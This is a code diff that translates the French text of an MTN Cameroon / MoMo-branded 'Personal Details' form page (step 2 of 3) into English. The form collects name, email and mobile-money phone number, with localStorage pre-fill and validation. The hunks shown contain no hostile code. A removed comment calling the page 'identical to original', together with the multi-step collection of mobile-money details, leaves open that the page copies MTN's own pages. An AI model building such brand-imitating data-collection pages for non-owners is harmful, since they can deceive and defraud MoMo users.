@@ -1,14 +1,12 @@
 <!DOCTYPE html>
-<html lang="fr">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN  | Coordonnées personnelles – mtn.cm</title>
+    <title>MTN  | Personal Details – mtn.cm</title>
     <meta name="theme-color" content="#FFCC00">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* identical to original – no changes needed */
         * {
             margin: 0;
             padding: 0;
@@ -352,34 +350,34 @@
         <div class="form-card">
             <div class="error-box" id="errorBox">
                 <div class="close" onclick="hideError()">×</div>
-                <div class="error-title">Erreur</div>
-                <div class="error-text" id="errorText">Veuillez corriger les champs surlignés.</div>
+                <div class="error-title">Error</div>
+                <div class="error-text" id="errorText">Please correct the highlighted fields.</div>
             </div>
 
-            <h1 class="form-title">Coordonnées personnelles</h1>
+            <h1 class="form-title">Personal Details</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Étape 2 sur 3</div>
+            <div class="step-text">Step 2 of 3</div>
 
             <div class="name-group">
                 <div>
-                    <label class="form-label">Prénom</label>
-                    <input type="text" class="form-input" id="firstName" placeholder="ex. Jean">
+                    <label class="form-label">First Name</label>
+                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Jean">
                 </div>
                 <div>
-                    <label class="form-label">Nom</label>
-                    <input type="text" class="form-input" id="lastName" placeholder="ex. Nkolo">
+                    <label class="form-label">Last Name</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Nkolo">
                 </div>
             </div>
 
             <div class="form-group">
-                <label class="form-label">Adresse e-mail</label>
-                <input type="email" class="form-input" id="email" placeholder="ex. jean.nkolo@example.com">
+                <label class="form-label">Email Address</label>
+                <input type="email" class="form-input" id="email" placeholder="e.g. jean.nkolo@example.com">
             </div>
 
             <div class="form-group">
-                <label class="form-label">Numéro de téléphone (MTN MoMo)</label>
+                <label class="form-label">Phone Number (MTN MoMo)</label>
                 <div id="phoneGroup">
                     <span>+237</span>
                     <input type="tel" id="phone" placeholder="6 55 123 456" maxlength="11" inputmode="numeric">
@@ -387,13 +385,13 @@
             </div>
 
             <div class="btn-group">
-                <button class="prev-btn" onclick="history.back()">PRÉCÉDENT</button>
-                <button class="next-btn" id="nextBtn">ÉTAPE SUIVANTE</button>
+                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+                <button class="next-btn" id="nextBtn">NEXT STEP</button>
             </div>
         </div>
     </main>
     <footer>
-        © 2026 MTN Cameroun – Services financiers mobiles agréés | Propulsé par MTN Mobile Money (MoMo) | Conditions de  applicables
+        © 2026 MTN Cameroon – Licensed mobile financial services | Powered by MTN Mobile Money (MoMo) | Terms apply
     </footer>
 
     <div id="spinner">
@@ -411,14 +409,14 @@
         const errorBox = document.getElementById('errorBox');
         const errorText = document.getElementById('errorText');
 
-        // Pré-remplir depuis localStorage si disponible
+        // Pre-fill from localStorage if available
         if (localStorage.getItem('firstName')) firstNameInput.value = localStorage.getItem('firstName');
         if (localStorage.getItem('lastName')) lastNameInput.value = localStorage.getItem('lastName');
         if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
         if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');
 
         function showError(message) {
-            errorText.innerText = message || 'Veuillez corriger les champs surlignés.';
+            errorText.innerText = message || 'Please correct the highlighted fields.';
             errorBox.style.display = 'block';
         }
 
@@ -433,7 +431,7 @@
         }
 
         function isValidPhoneNumber(phoneDigits) {
-            // Pour le Cameroun, on attend exactement 9 chiffres
+            // For Cameroon, expect exactly 9 digits
             return /^\d{9}$/.test(phoneDigits);
         }
 
@@ -451,42 +449,42 @@
             if (!firstName) {
                 firstNameInput.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Le prénom est requis.';
+                errorMsg = 'First name is required.';
             } else if (firstName.length < 2) {
                 firstNameInput.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Le prénom doit comporter au moins 2 caractères.';
+                errorMsg = 'First name must be at least 2 characters.';
             }
 
             if (!lastName) {
                 lastNameInput.classList.add('invalid');
                 isValid = false;
-                if (!errorMsg) errorMsg = 'Le nom est requis.';
+                if (!errorMsg) errorMsg = 'Last name is required.';
             } else if (lastName.length < 2) {
                 lastNameInput.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Le nom doit comporter au moins 2 caractères.';
+                errorMsg = 'Last name must be at least 2 characters.';
             }
 
             if (!phoneRaw) {
                 phoneGroup.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Le numéro de téléphone est requis.';
+                errorMsg = 'Phone number is required.';
             } else if (!/^\d{9}$/.test(phoneRaw)) {
                 phoneGroup.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Le numéro doit comporter 9 chiffres (ex: 655123456).';
+                errorMsg = 'Phone number must be 9 digits (e.g. 655123456).';
             }
 
             const email = emailInput.value.trim();
             if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
                 emailInput.classList.add('invalid');
                 isValid = false;
-                errorMsg = 'Veuillez saisir une adresse e-mail valide (ex: nom@domaine.cm).';
+                errorMsg = 'Please enter a valid email address (e.g. name@domain.cm).';
             }
 
             if (!isValid) {
-                showError(errorMsg || 'Veuillez corriger les champs surlignés.');
+                showError(errorMsg || 'Please correct the highlighted fields.');
                 const firstInvalid = document.querySelector('.invalid');
                 if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 return false;
@@ -537,5 +535,4 @@
         window.hideError = hideError;
     </script>
 </body>
-
 </html>
